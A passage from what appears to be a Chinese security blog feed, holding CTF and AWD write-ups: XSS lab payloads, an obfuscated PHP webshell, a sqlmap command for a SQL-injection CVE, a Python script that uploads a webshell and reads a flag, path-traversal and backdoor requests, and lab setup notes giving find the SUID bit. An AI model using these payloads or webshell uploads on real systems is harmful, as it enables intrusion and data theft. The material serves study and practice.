class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;html&gt;</span><br><span class="hljs-string">&lt;head&gt;</span><br><span class="hljs-string">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="hljs-string">&lt;title&gt;欢迎来到level14&lt;/title&gt;</span><br><span class="hljs-string">&lt;/head&gt; </span><br><span class="hljs-string">&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=&quot;./index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="hljs-string">&lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="hljs-string">&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/center&gt;&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-variable">$allowedExts</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>, <span class="hljs-string">&quot;jpeg&quot;</span>, <span class="hljs-string">&quot;jpg&quot;</span>, <span class="hljs-string">&quot;png&quot;</span>);<br>        <span class="hljs-variable">$temp</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);<br>        <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$temp</span>);<br><br>        <span class="hljs-keyword">if</span> (((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;image/gif&quot;</span>)<br>        || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;image/jpeg&quot;</span>)<br>        || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;image/jpg&quot;</span>)<br>        || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;image/pjpeg&quot;</span>)<br>        || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;image/x-png&quot;</span>)<br>        || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;image/png&quot;</span>))<br>        &amp;&amp; (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] &gt; <span class="hljs-number">204800</span>) <span class="hljs-comment">// 小于 200 kb</span><br>        &amp;&amp; <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$extension</span>, <span class="hljs-variable">$allowedExts</span>)) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] &gt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;错误：: &quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;上传文件名: &quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>] . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>                <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-string">&#x27;uploads&#x27;</span>)) &#123;<br>                    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&#x27;uploads&#x27;</span>, <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>);<br>                &#125;<br>                <span class="hljs-variable">$filePath</span> = <span class="hljs-string">&#x27;uploads/&#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>                <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>], <span class="hljs-variable">$filePath</span>);<br><br>                <span class="hljs-comment">// 读取EXIF信息</span><br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filePath</span>)) &#123;<br>                    <span class="hljs-variable">$exif</span> = <span class="hljs-title function_ invoke__">exif_read_data</span>(<span class="hljs-variable">$filePath</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">true</span>);<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h4&gt;[ &quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>] . <span class="hljs-string">&quot; ]的EXIF信息:&lt;/h4&gt;&quot;</span>;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$exif</span>) &#123;<br>                        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$exif</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$section</span>) &#123;<br>                            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$section</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$name</span> =&gt; <span class="hljs-variable">$val</span>) &#123;<br>                                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$key</span>.<span class="hljs-subst">$name</span>: <span class="hljs-subst">$val</span>&lt;br /&gt;\n&quot;</span>;<br>                            &#125;<br>                        &#125;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;没有找到EXIF信息。&lt;br&gt;&quot;</span>;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件不存在。&lt;br&gt;&quot;</span>;<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;非法的文件格式或文件过大。&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$e</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><h1 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">?src=&#x27;./level1.php?name=<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">alert()</span>&gt;</span>&#x27;<br></code></pre></td></tr></table></figure><p><img src="/2024/09/05/XSS-writeup/image-20240906170339779.png" alt="image-20240906170339779"></p><p>ng-include文件包涵</p><h1 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">keyword</span>=&lt;svg%0Aonload=alert(1)&gt;<br></code></pre></td></tr></table></figure><p><img src="/2024/09/05/XSS-writeup/image-20240906170440940.png" alt="image-20240906170440940"></p><p>小写转换+空格实体化，回车代替空格绕过</p><h1 id="level-17-18"><a href="#level-17-18" class="headerlink" title="level 17/18"></a>level 17/18</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">arg01</span>=a&amp;arg02=b <span class="hljs-attribute">onmouseover</span>=alert(1)<br></code></pre></td></tr></table></figure><p><img src="/2024/09/05/XSS-writeup/image-20240906170740131.png" alt="image-20240906170740131"></p><p>闭合属性事件触发</p><h1 id="level-19"><a href="#level-19" class="headerlink" title="level 19"></a>level 19</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">arg01</span>=version&amp;arg02=&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;javascript:alert()&quot;</span>&gt;here&lt;/a&gt;<br></code></pre></td></tr></table></figure><p>Flash xss</p><h1 id="level-20"><a href="#level-20" class="headerlink" title="level 20"></a>level 20</h1><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">?arg01=id<span class="hljs-meta">&amp;arg02=xss\&quot;))&#125;catch(e)&#123;alert(1)&#125;<span class="hljs-comment">//%26width=123%26height=123</span></span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>gaatitrack</title>
    <link href="/2024/07/29/gaatitrack/"/>
    <url>/2024/07/29/gaatitrack/</url>
    
    <content type="html"><![CDATA[<h1 id="gaatitrack"><a href="#gaatitrack" class="headerlink" title="gaatitrack"></a>gaatitrack</h1><h2 id="漏洞1：免杀混淆马"><a href="#漏洞1：免杀混淆马" class="headerlink" title="漏洞1：免杀混淆马"></a>漏洞1：免杀混淆马</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">goto</span> PFBx1; CEKfL: <span class="hljs-variable">$WFOjN</span> = <span class="hljs-title function_ invoke__">substr</span>((<span class="hljs-keyword">string</span>) <span class="hljs-variable">$tCGqQ</span>-&gt;<span class="hljs-title function_ invoke__">getName</span>(), <span class="hljs-number">1</span>, <span class="hljs-number">3</span>) . <span class="hljs-title function_ invoke__">substr</span>((<span class="hljs-keyword">string</span>) <span class="hljs-variable">$tCGqQ</span>-&gt;<span class="hljs-title function_ invoke__">getName</span>(), <span class="hljs-number">8</span>); <span class="hljs-keyword">goto</span> i8J9H; PFBx1: <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ssysgametem</span> </span>&#123; <span class="hljs-keyword">public</span> <span class="hljs-variable">$u0yA0</span>; &#125; <span class="hljs-keyword">goto</span> cYm2s; VUGem: @(<span class="hljs-variable">$tCGqQ</span>-&gt;u0yA0 = <span class="hljs-variable">$_POST</span>[<span class="hljs-title function_ invoke__">substr</span>((<span class="hljs-keyword">string</span>) <span class="hljs-variable">$tCGqQ</span>-&gt;<span class="hljs-title function_ invoke__">getName</span>(), <span class="hljs-number">4</span>, <span class="hljs-number">4</span>)]); <span class="hljs-keyword">goto</span> CEKfL; cYm2s: <span class="hljs-variable">$tCGqQ</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionClass</span>(<span class="hljs-string">&quot;\x73\163\x79\x73\x67\141\x6d\x65\164\x65\x6d&quot;</span>); <span class="hljs-keyword">goto</span> VUGem; i8J9H: @<span class="hljs-variable">$WFOjN</span>(<span class="hljs-variable">$tCGqQ</span>-&gt;u0yA0);<br></code></pre></td></tr></table></figure><p>将$WFOjN参数打印出来，发现是system,但是直接打印system函数里的内容tCGqQ-&gt;u0yA0没用,Ctrl+F搜索到通过一个post传参，将里面的内容打印出来，得到system执行的参数game</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> @<span class="hljs-variable">$WFOjN</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">substr</span>((<span class="hljs-keyword">string</span>) <span class="hljs-variable">$tCGqQ</span>-&gt;<span class="hljs-title function_ invoke__">getName</span>(), <span class="hljs-number">4</span>, <span class="hljs-number">4</span>);<br></code></pre></td></tr></table></figure><p><img src="/2024/07/29/gaatitrack/4pzcws6b.png" alt="4pzcws6b"></p><p>验证</p><p><img src="/2024/07/29/gaatitrack/image-20240829135433248.png" alt="image-20240829135433248"></p><h2 id="漏洞2：-CVE-2023-48823"><a href="#漏洞2：-CVE-2023-48823" class="headerlink" title="漏洞2： CVE-2023-48823"></a>漏洞2： <a href="https://packetstormsecurity.com/files/cve/CVE-2023-48823">CVE-2023-48823</a></h2><p>/var/www/html/ajax.php中email参数存在sql盲注,详细<a href="https://packetstormsecurity.com/files/176030/GaatiTrack-Courier-Management-System-1.0-SQL-Injection.html">GaatiTrack Courier Management System 1.0 SQL Injection ≈ Packet Storm (packetstormsecurity.com)</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python3">python3 sqlmap.py -u &quot;http://192.168.232.133:7001/ajax.php?action=login&quot;  --data=&quot;email=test%40&quot;   -a   --batch<br></code></pre></td></tr></table></figure><p><img src="/2024/07/29/gaatitrack/image-20240828220128460.png" alt="image-20240828220128460"></p><h2 id="漏洞3：后台账户密码泄露"><a href="#漏洞3：后台账户密码泄露" class="headerlink" title="漏洞3：后台账户密码泄露"></a>漏洞3：后台账户密码泄露</h2><p>网站子目录Credentials下username and password.txt存在账户密码</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">Username : <span class="hljs-type">mayuri.infospace</span>@gmail.com<br>Password : <span class="hljs-type">admin</span><br></code></pre></td></tr></table></figure><h2 id="漏洞4：后台任意文件上传"><a href="#漏洞4：后台任意文件上传" class="headerlink" title="漏洞4：后台任意文件上传"></a>漏洞4：后台任意文件上传</h2><p>后台管理账户管理处存在任意文件上传</p><p><img src="/2024/07/29/gaatitrack/image-20240829120821581.png" alt="image-20240829120821581"></p><p>生成时间戳+‘_’+文件名的木马，poc如下，无需登录</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br>ip<span class="hljs-operator">=</span><span class="hljs-string">&quot;http://192.168.232.133:7001/&quot;</span><br>burp0_url <span class="hljs-operator">=</span> ip<span class="hljs-operator">+</span><span class="hljs-string">&quot;/ajax.php?action=update_user&quot;</span><br>burp0_headers <span class="hljs-operator">=</span> &#123;<span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;*/*&quot;</span>, <span class="hljs-string">&quot;X-Requested-With&quot;</span>: <span class="hljs-string">&quot;XMLHttpRequest&quot;</span>, <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36&quot;</span>, <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;multipart/form-data; boundary=----WebKitFormBoundary8BMXafUA11P6WdIS&quot;</span>, <span class="hljs-string">&quot;Origin&quot;</span>: <span class="hljs-string">&quot;http://192.168.232.133:7001&quot;</span>, <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://192.168.232.133:7001/index.php?page=home&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate, br&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.9&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>&#125;<br>burp0_data <span class="hljs-operator">=</span> <span class="hljs-string">&quot;------WebKitFormBoundary8BMXafUA11P6WdIS<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Content-Disposition: form-data; name=<span class="hljs-subst">\&quot;</span>id<span class="hljs-subst">\&quot;</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>1<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>------WebKitFormBoundary8BMXafUA11P6WdIS<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Content-Disposition: form-data; name=<span class="hljs-subst">\&quot;</span>firstname<span class="hljs-subst">\&quot;</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Mayuri K<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>------WebKitFormBoundary8BMXafUA11P6WdIS<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Content-Disposition: form-data; name=<span class="hljs-subst">\&quot;</span>lastname<span class="hljs-subst">\&quot;</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>K<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>------WebKitFormBoundary8BMXafUA11P6WdIS<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Content-Disposition: form-data; name=<span class="hljs-subst">\&quot;</span>email<span class="hljs-subst">\&quot;</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>mayuri.infospace@gmail.com<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>------WebKitFormBoundary8BMXafUA11P6WdIS<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Content-Disposition: form-data; name=<span class="hljs-subst">\&quot;</span>password<span class="hljs-subst">\&quot;</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>------WebKitFormBoundary8BMXafUA11P6WdIS<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Content-Disposition: form-data; name=<span class="hljs-subst">\&quot;</span>img<span class="hljs-subst">\&quot;</span>; filename=<span class="hljs-subst">\&quot;</span>1.php<span class="hljs-subst">\&quot;</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Content-Type: application/octet-stream<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>&lt;?php @system($_POST[&#x27;a&#x27;]);?&gt;<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>------WebKitFormBoundary8BMXafUA11P6WdIS--<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>&quot;</span><br>res<span class="hljs-operator">=</span>requests.post(burp0_url, headers<span class="hljs-operator">=</span>burp0_headers,  data<span class="hljs-operator">=</span>burp0_data)<br>t<span class="hljs-operator">=</span>int(time.time())<br><span class="hljs-built_in">print</span>(t)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">100</span>):<br>    url<span class="hljs-operator">=</span>ip<span class="hljs-operator">+</span>&#x27;assets<span class="hljs-regexp">/uploads/</span>&#x27;<span class="hljs-operator">+</span>str(t<span class="hljs-operator">-</span>i)<span class="hljs-operator">+</span>&#x27;_1.php&#x27;<br>    #<span class="hljs-built_in">print</span>(url)<br>    data<span class="hljs-operator">=</span>&#123;&#x27;a&#x27;:&#x27;cat <span class="hljs-operator">/</span>flag.txt&#x27;&#125;<br>    c<span class="hljs-operator">=</span>requests.post(url,data)<br>    <span class="hljs-keyword">if</span>  c.status_code <span class="hljs-operator">==</span> <span class="hljs-number">200</span>:<br>        <span class="hljs-built_in">print</span>(url)<br>        <span class="hljs-built_in">print</span>(c.text)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>长城杯 AWD</title>
    <link href="/2024/07/17/ccb/"/>
    <url>/2024/07/17/ccb/</url>
    
    <content type="html"><![CDATA[<h1 id="funadmin"><a href="#funadmin" class="headerlink" title="funadmin"></a>funadmin</h1><h2 id="漏洞1："><a href="#漏洞1：" class="headerlink" title="漏洞1："></a>漏洞1：</h2><p>/app/api/controller/v1/Token.php存在一句话木马</p><p><img src="/2024/07/17/ccb/image-20240917161604032.png" alt="image-20240917161604032"></p><h2 id="漏洞2：任意文件读取"><a href="#漏洞2：任意文件读取" class="headerlink" title="漏洞2：任意文件读取"></a>漏洞2：任意文件读取</h2><p>app/frontend/controller/Ajax.php存在文件读取</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">frontend<span class="hljs-regexp">/Ajax/g</span>etfile?<span class="hljs-keyword">file</span>=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>flag<br></code></pre></td></tr></table></figure><p><img src="/2024/07/17/ccb/image-20240917161615348.png" alt="image-20240917161615348"></p><h2 id="漏洞3：phtml文件上传"><a href="#漏洞3：phtml文件上传" class="headerlink" title="漏洞3：phtml文件上传"></a>漏洞3：phtml文件上传</h2><p>后台用户头像抓包修改可上传phtml文件</p><p><img src="/2024/07/17/ccb/image-20240917161625669.png" alt="image-20240917161625669"></p><h2 id="漏洞4：后台任意文件上传"><a href="#漏洞4：后台任意文件上传" class="headerlink" title="漏洞4：后台任意文件上传"></a>漏洞4：后台任意文件上传</h2><p>离线上传一个包含木马的zip文件，木马会被解压放到addons目录</p><p><img src="/2024/07/17/ccb/image-20240917161635264.png" alt="image-20240917161635264"></p><p>首页cookie文件包含</p><p><img src="/2024/07/17/ccb/image-20240917161644955.png" alt="image-20240917161644955"></p><h2 id="漏洞5：信息泄露"><a href="#漏洞5：信息泄露" class="headerlink" title="漏洞5：信息泄露"></a>漏洞5：信息泄露</h2><p>首页源代码泄露admin账户密码</p><p><img src="/2024/07/17/ccb/image-20240917161653436.png" alt="image-20240917161653436"></p><p>参考<a href="https://www.qwesec.com/2024/05/changchengcup.html">https://www.qwesec.com/2024/05/changchengcup.html</a></p><h1 id="教务系统"><a href="#教务系统" class="headerlink" title="教务系统"></a>教务系统</h1><h2 id="漏洞一：命令执行"><a href="#漏洞一：命令执行" class="headerlink" title="漏洞一：命令执行"></a>漏洞一：命令执行</h2><p>forget.jsp存在命令执行</p><p><img src="/2024/07/17/ccb/image-20240909162053704.png" alt="image-20240909162053704"></p><p>验证</p><p><img src="/2024/07/17/ccb/image-20240909162159781.png" alt="image-20240909162159781"></p><h2 id="漏洞二：后台头像任意文件上传"><a href="#漏洞二：后台头像任意文件上传" class="headerlink" title="漏洞二：后台头像任意文件上传"></a>漏洞二：后台头像任意文件上传</h2><p>sql文件泄露教师账户密码，登录上传jsp马</p><p><img src="/2024/07/17/ccb/image-20240909163336435.png" alt="image-20240909163336435"></p><p><img src="/2024/07/17/ccb/image-20240909163415171.png" alt="image-20240909163415171"></p><h2 id="漏洞三：登录页面sql注入"><a href="#漏洞三：登录页面sql注入" class="headerlink" title="漏洞三：登录页面sql注入"></a>漏洞三：登录页面sql注入</h2><p>账户密码可用万能密码1’ or ‘1’=’1登录</p><p><img src="/2024/07/17/ccb/image-20240909170401033.png" alt="image-20240909170401033"></p><p>账户密码直接接入sql语句</p><h2 id="漏洞四：密码修改越权"><a href="#漏洞四：密码修改越权" class="headerlink" title="漏洞四：密码修改越权"></a>漏洞四：密码修改越权</h2><p>可根据id修改其他同类用户密码</p><p><img src="/2024/07/17/ccb/image-20240909173800193.png" alt="image-20240909173800193"></p><h1 id="DocToolkit"><a href="#DocToolkit" class="headerlink" title="DocToolkit"></a>DocToolkit</h1><h2 id="漏洞一：后门"><a href="#漏洞一：后门" class="headerlink" title="漏洞一：后门"></a>漏洞一：后门</h2><p><img src="/2024/07/17/ccb/image-20240909175604238.png" alt="image-20240909175604238"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/test/backd0or?cmd=<span class="hljs-built_in">cat</span> /flag<br></code></pre></td></tr></table></figure><h2 id="漏洞二：shiro反序列化"><a href="#漏洞二：shiro反序列化" class="headerlink" title="漏洞二：shiro反序列化"></a>漏洞二：shiro反序列化</h2><p>在jar包里找到密钥</p><p><img src="/2024/07/17/ccb/image-20240909175108987.png" alt="image-20240909175108987"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>AWD搭建</title>
    <link href="/2024/06/29/AWD%E6%90%AD%E5%BB%BA/"/>
    <url>/2024/06/29/AWD%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<p>本次搭建awd靶机为ciscn华中awd靶机</p><h1 id="game"><a href="#game" class="headerlink" title="game"></a>game</h1><p>知识点：栈溢出，格式化字符串，SUID提权</p><p>比赛时这个靶机pwn工作目录放在了根目录，找个pwn靶机环境（</p><p>），安装好ssh，并设置ctf用户登录，再给find命令SUID权限</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">chmod u+s <span class="hljs-built_in">find</span><br></code></pre></td></tr></table></figure><p>比赛靶机pwn工作目录放在了根目录，用户目录又存在usr目录，没看懂</p><h1 id="gaatitrack"><a href="#gaatitrack" class="headerlink" title="gaatitrack"></a>gaatitrack</h1><p>环境：ubuntu18.04，apache2，mysql5.7，php7.2</p><p>这样我采用的是从头搭建，换源后安装ssh、apache2，mysql5.7，php7.2，</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">apt-<span class="hljs-built_in">get</span> install -y openssh-server<br>apt-<span class="hljs-built_in">get</span> install apache2<br>apt-<span class="hljs-built_in">get</span> install mysql-server<br>apt-<span class="hljs-built_in">get</span> install php7.2<br>apt install php-fpm<br></code></pre></td></tr></table></figure><p>同样添加ctf用户，用于连ssh，root也行。安装好后配置好apache2、mysql，由于mysql是新装，所以要设置root的一些配置，授权，修改加密规则等等，</p><p>把网站文件放在/var/www/html，导入数据库文件，把apapche2，mysql都开启就可以访问了，如果访问失败或者网页空白，检查下/var/log目录下两者的日志文件，查看错误原因。</p><p>mysql注释掉 bind-address = 127.0.0.1</p><p><img src="/2024/06/29/AWD%E6%90%AD%E5%BB%BA/image-20240629101354724.png" alt="image-20240629101354724"></p><p>当然如果只是复现环境，建议直接用小皮面板，导入数据库后，把文件放在www目录下就可以直接访问了</p><h1 id="warehouse"><a href="#warehouse" class="headerlink" title="warehouse"></a>warehouse</h1><p>java+mysql设置好开机运行jar</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ATT-CK红队评估实战内网靶场(一)</title>
    <link href="/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/"/>
    <url>/2024/06/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/</url>
    
